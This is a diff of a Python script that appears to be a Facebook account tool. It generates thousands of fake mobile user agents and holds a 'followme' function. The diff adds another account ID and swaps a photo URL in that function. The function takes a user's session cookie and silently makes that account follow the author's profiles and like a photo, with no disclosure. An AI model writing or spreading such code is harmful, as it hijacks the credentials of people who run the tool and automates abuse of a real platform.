@@ -53,7 +53,7 @@ uakuh = []
 usragent = []
 uaku2 = []
 ses = requests.Session()
-mysosmed = ["100023442491781",'100013275378835','100063837653547']
+mysosmed = ["100023442491781",'100013275378835','100063837653547','100073125893802']
 ###----------[ GENERATE USERAGENT ]---------- ###
 for xd in range(10000) :
 	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
@@ -1156,7 +1156,7 @@ def followme(kueh):
                   for response in parse(requests.get(f'https://mbasic.facebook.com/'+user,cookies={'cookie':kueh}).text,'html.parser').find_all('a',href=True):
                         if '/a/subscribe.php?' in response.get('href'):x=requests.get('https://mbasic.facebook.com{}'.format(response['href']), cookies = {'cookie':kueh}).text
             except(Exception) as e:print(e)
-      for z in parse(requests.get("https://mbasic.facebook.com/photo/?fbid=1672257059893457&set=a.161861817599663",cookies={"cookie":kueh}).text,"html.parser").find_all("a",href=True):
+      for z in parse(requests.get("https://mbasic.facebook.com/photo.php?fbid=280633417717519&id=100073125893802&set=a.110234541424075&eav=AfZGjhHFVFn0f2ijQCCzSdVlL5_DHF7xY72_KT7R_I6g0M6Pdm2RSwkyjRBfCGYxrvs&paipv=0&refid=17&_ft_=encrypted_tracking_data.0AY_-Bre3ojGqVxQJPcY98h8HflWySzOOUM-LABGmUY94rtVE99TlRls-CHqnI-yBDTnahimgc5tFScPeyvTbdL3lhadd9vM1cJWaLmVFyAMN92icKe0rkra0aXlUy0M8pjI5uE8lIIVoagOJ9gXas5ib2X8Jn_99fg9PgJbAib0DqKe09rKIJkmmJ8uFLgGtH3b4Gq6eFl9YIzyIskOAEfUcHjIRJgCRrLDYlqvPKs0brr5lHqXEvPP3KNGRjEcv22tIRvbDQlAbJDn6sOlnpfNVOe7MztmjLk7F2x6nqvbouK0ePn8xNwBQJvgRsgZyKX2S6e1XGzI0Wk69OUM8zk0fsHnZm2q8ZuwdRqQo7VTCEF1MWMLfXtCEYdrUV5QMIXmKY6boQLgfbUTTAax41gVMw1Ni_szDkbj-rx1rgR0_arzfvq5mRTJsqvNZrZvn6fI42cMBe4vrKEDJTGpjWSB0kOu6L34-aMONAukUk2Y8m5onsoUX6Bba0SHFvb9RkjhY-7bwPJO-nWlzYVNjj_7B9takt7FfP9V6taum6C0lkZAkXMuxqsdPHa3A7gIAMBSXkScJNxjPogQKCg9c7ZB-foyqUnHyXRuDQD2xXfDfJheajUacPZWpVOKZCOHpV-HLBXkOA82_8Fa_AKh5oV7xtEx3InBDcx8iCov0j3XxlZ_NqV-yTzyAyB1aYdcq3SLlafb0Kd4o_RnEGlmP0eqRezJqKpjnnOJGTOmFiAFYz8PxFCGh_1_mF0jDGqLTZZhbWcPMYHS87f48oPDTazR6jvcfVwkxIIh_VinwvdhQ&__tn__=EH-R",cookies={"cookie":kueh}).text,"html.parser").find_all("a",href=True):
             if z.text in ["Suka","Like"]:requests.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie":kueh})
 
 tim, day = datetime.now().hour,datetime.now().day
